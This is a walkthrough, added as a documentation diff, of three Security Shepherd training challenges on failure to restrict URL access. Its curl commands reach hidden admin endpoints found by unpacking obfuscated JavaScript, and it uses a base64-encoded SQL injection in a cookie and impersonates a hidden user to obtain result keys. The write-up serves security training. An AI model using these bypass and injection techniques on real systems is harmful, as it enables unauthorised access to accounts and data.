@@ -1,0 +1,190 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdURLAccess:
+
+******************************
+Failure to Restrict URL Access
+******************************
+
+
+Failure to Restrict URL Access Challenge 1
+==========================================
+
+Viewing the page source using Firebug reveals hidden admin form leAdminForm with URL /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992.
+
+.. code-block:: bash
+  :emphasize-lines: 1-3
+
+  # Tamper Data provides COOKIE, Firebug provides URL
+  COOKIE='JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  URL='https://securityshepherd.com/challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992'
+
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data 'userData=4816283' \
+       $URL
+
+Running this form gives the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Result key is
+  DwKJkkHIBG8hxnn8RHxmPF89G3csUVmq8RXQXB+kVu6wN1BTY3412AxWbHq7cP+qghYCPH9Po/NJUanldZVaLCHckdybkL+pXWvP6TuGd4eJtms6BDl/o8CvtmdQeBPn
+
+
+Failure to Restrict URL Access Challenge 2
+==========================================
+
+Viewing the page source using Firebug reveals this JavaScript:
+
+.. code-block:: javascript
+
+  eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$("#A").f(3(){$("#8").5("9");$("#7").4("1");$("#2").5("1",3(){e 0=$.h({i:"j",b:"v",c:{u:"t",},d:g});m(0.6==k){$("#2").a(0.s)}q{$("#2").a("<p> l r n: "+0.6+" "+0.o+"</p>")}$("#2").4("1",3(){$("#7").5("9",3(){$("#8").4("1")})})})});$("#w").f(3(){$("#8").5("9");$("#7").4("1");$("#2").5("1",3(){e 0=$.h({i:"j",b:"x",c:{y:"z",},d:g});m(0.6==k){$("#2").a(0.s)}q{$("#2").a("<p> l r n: "+0.6+" "+0.o+"</p>")}$("#2").4("1",3(){$("#7").5("9",3(){$("#8").4("1")})})})});',37,37,'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|ismcoa98sUD8j21dmdoasmcoISOdjh3189|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{}))
+
+Running this JavaScript through the http://www.jspretty.com/ gives us this readable code:
+
+.. code-block:: javascript
+
+  $("#leForm").submit(function() {
+      $("#submitButton").hide("fast");
+      $("#loadingSign").show("slow");
+      $("#resultsDiv").hide("slow", function() {
+          var ajaxCall = $.ajax({
+              type: "POST",
+              url: "278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa",
+              data: {
+                  guestData: "ismcoa98sUD8j21dmdoasmcoISOdjh3189",
+              },
+              async: false
+          });
+          if (ajaxCall.status == 200) {
+              $("#resultsDiv").html(ajaxCall.responseText)
+          } else {
+              $("#resultsDiv").html("<p> An Error Occurred: " + ajaxCall.status + " " + ajaxCall.statusText + "</p>")
+          }
+          $("#resultsDiv").show("slow", function() {
+              $("#loadingSign").hide("fast", function() {
+                  $("#submitButton").show("slow")
+              })
+          })
+      })
+  });
+  $("#leAdministratorFormOfAwesomeness").submit(function() {
+      $("#submitButton").hide("fast");
+      $("#loadingSign").show("slow");
+      $("#resultsDiv").hide("slow", function() {
+          var ajaxCall = $.ajax({
+              type: "POST",
+              url: "278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin",
+              data: {
+                  adminData: "youAreAnAdminOfAwesomenessWoopWoop",
+              },
+              async: false
+          });
+          if (ajaxCall.status == 200) {
+              $("#resultsDiv").html(ajaxCall.responseText)
+          } else {
+              $("#resultsDiv").html("<p> An Error Occurred: " + ajaxCall.status + " " + ajaxCall.statusText + "</p>")
+          }
+          $("#resultsDiv").show("slow", function() {
+              $("#loadingSign").hide("fast", function() {
+                  $("#submitButton").show("slow")
+              })
+          })
+      })
+  });
+
+This code has form leAdministratorFormOfAwesomeness with URL /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin and parameter **adminData=youAreAnAdminOfAwesomenessWoopWoop**.
+
+.. code-block:: bash
+  :emphasize-lines: 1-6
+
+  # Tamper Data provides COOKIE
+  COOKIE='JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  # The beautified JavaScript gives us the URL and POSTDATA
+  URL='https://securityshepherd.com/challenges'
+  URL="$URL/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin"
+  POSTDATA='adminData=youAreAnAdminOfAwesomenessWoopWoop'
+
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "$POSTDATA" \
+       $URL
+
+Running this form gives the result key:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Hey Admin, Here is that key you are looking for:
+  lB1GNb6ecyIGCTnzH7I2IeQ5XyG/HvlxMnFvhGwa7oNJWNzeibZknLNNtsAYGfluTOEhYGthAXzu2mqp2uchDWPzNKxW2Dfu0hiBoru1FPtfL5sfrGoSdcBXshAuVP/d
+
+
+Failure to Restrict URL Access 3
+================================
+
+Viewing the page source using Firebug reveals form leForm2 with URL /challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList.
+
+.. code-block:: bash
+  :emphasize-lines: 1-3
+
+  # Tamper Data provides COOKIE and URL
+  COOKIE='currentPerson=YUd1ZXN0; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  URL='https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList'
+
+  curl --silent --insecure  \
+       -X POST \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       "$URL"
+
+Running this form lists these 17 users: aGuest, manager, sean, root, administrator, privileged, seanduggan, markdenihan, mark, superuser, megauser, hyperuser, godzilla, kinguser, rootuser, adminuser, and shepherd.
+
+Looking more closely at the **currentPerson=YUd1ZXN0** cookie reveals "YUd1ZXN0" is base64 encoding of "aGuest". What didn't work is substituting each of the 17 above user accounts (base64 encoded) for "aGuest" in the cookie used to access the button :guilabel:`Admin Only Button`.
+
+However, assuming the cookie is SQL injectable, trying the base64 equivalent of **currentPerson=" OR "1" != "0** returns a user list.
+
+.. code-block:: bash
+  :emphasize-lines: 1-5
+
+  # Tamper Data provides COOKIE, Firebug provides URL
+  U='" OR "1" != "0'
+  B64U=$(echo -n "$U" | base64)
+  COOKIE='currentPerson='"$B64U"'; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  URL='https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList'
+
+  curl -v --insecure  \
+       -X POST \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       "$URL"
+
+Running this lists 18 users: the 17 users above plus MrJohnReillyTheSecond. One last try for the button :guilabel:`Admin Only Button` using MrJohnReillyTheSecond gives the result key:
+
+.. code-block:: bash
+  :emphasize-lines: 1-5
+
+  # Tamper Data provides COOKIE, Firebug or Tamper Data provides URL
+  U="MrJohnReillyTheSecond"
+  B64U=$(echo -n "$U" | base64)
+  COOKIE='currentPerson='"$B64U"'; JSESSIONID=3EE1E25E290DB8ACFC5BD4CD721A931F; token=37327158570601754164282364053696593740; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  URL='https://securityshepherd.com/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4'
+
+  curl -v --insecure  \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "userId=d3d9446802a44259755d38e6d163e820" \
+       --data-urlencode "secure=true" \
+       "$URL"
+
+Running this gives the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Welcome super admin! Your result key is as follows
+  iDd0TzjBfevGrXo2omd0+HkF8CveJaLlQcsHqOgRjV/dYwNhFuQ58MpPvzjRq/wroaBAJs1OfeGGWIHwGSLvZ2tVFAAocgNZFw1HXweUMJq+rdeMJmJEi5J6HqBfvB+MzL/EpnLtxdWWzXnQMGVYilL8W3aYJzH3gsU3UQugrVc=
+
